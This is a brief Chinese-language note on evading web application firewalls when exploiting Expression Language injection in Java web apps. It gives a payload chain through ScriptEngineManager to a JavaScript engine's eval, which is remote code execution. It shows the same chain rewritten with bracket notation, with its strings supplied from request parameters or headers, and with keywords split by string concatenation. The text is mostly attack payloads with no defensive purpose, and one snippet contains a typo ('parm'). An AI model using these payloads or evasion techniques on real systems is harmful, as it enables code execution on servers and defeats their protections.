# el表达式绕waf的trick

在 el 表达式中，可以使用 `a["b"]` 或者 `a.b` 这两种方法来获取属性的

如果把函数名或者属性变成字符串，那去混淆就简单多了，比如 ``` "".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("payload") ``` 

可以变成 ``` ${""["getClass"]()["forName"]("javax.script.ScriptEngineManager")["newInstance"]()["getEngineByName"]("JavaScript")["eval"]("payload")} ``` 

同时支持param与header读取

其中每一个字符串都可以使用 `param.xxx` 的参数来替换，或者使用 el 表达式进行拼接转换，比如 ``` ${""["getClass"]()[param.a](param.b)[param.c]()[parm.d](param.e)[param.f](param.g)} ```

以上payload可以使用header做替换```${header['host'] }```

对于关键字过滤也可以使用+=绕过

```${""["getC"+="lass"]()```

